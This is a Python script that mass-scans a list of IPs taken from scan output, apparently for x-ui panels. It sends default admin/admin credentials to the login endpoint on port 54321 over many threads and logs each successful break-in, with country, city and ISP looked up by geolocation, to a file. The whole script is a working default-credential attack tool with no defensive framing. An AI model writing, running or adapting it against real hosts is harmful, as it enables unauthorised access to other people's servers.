import requests
from concurrent.futures import ThreadPoolExecutor

data = {
    'username': 'admin',
    'password': 'admin'
}

def get_ip_info(ip):
    url = f"http://ip-api.com/json/{ip}?fields=country,regionName,city,isp"
    try:
        response = requests.get(url, timeout=2)
        if response.status_code == 200:
            ip_info = response.json()
            country = ip_info.get('country', 'N/A')
            region = ip_info.get('regionName', 'N/A')
            city = ip_info.get('city', 'N/A')
            isp = ip_info.get('isp', 'N/A')
            return f"{country}, {region}, {city}, ISP: {isp}"
    except requests.exceptions.RequestException:
        pass
    return 'N/A'

def try_login(ip, protocol):
    url = f"{protocol}://{ip}:54321/login"
    for _ in range(3):
        try:
            response = requests.post(url, data=data, timeout=2, verify=(protocol == "https"))
            if response.status_code == 200:
                try:
                    response_data = response.json()
                    if isinstance(response_data, dict) and response_data.get("success"):
                        ip_info = get_ip_info(ip)
                        result = f"{ip} Successful ({ip_info})"
                        with open("xui.txt", "a") as xui_file:
                            xui_file.write(result + '\n')
                        return result
                except ValueError:
                    return f"Invalid JSON response from: {url}"
        except requests.exceptions.RequestException:
            pass
    return f"{ip} Def"

def process_ip(ip):
    result = try_login(ip, "http") or try_login(ip, "https")
    if result:
        print(result)

if __name__ == "__main__":
    with open("results.txt", "r") as file:
        ips = [line.split("Host: ")[1].split(" ")[0] for line in file if len(line.split("Host: ")) >= 2]

    with ThreadPoolExecutor() as executor:
        executor.map(process_ip, ips)
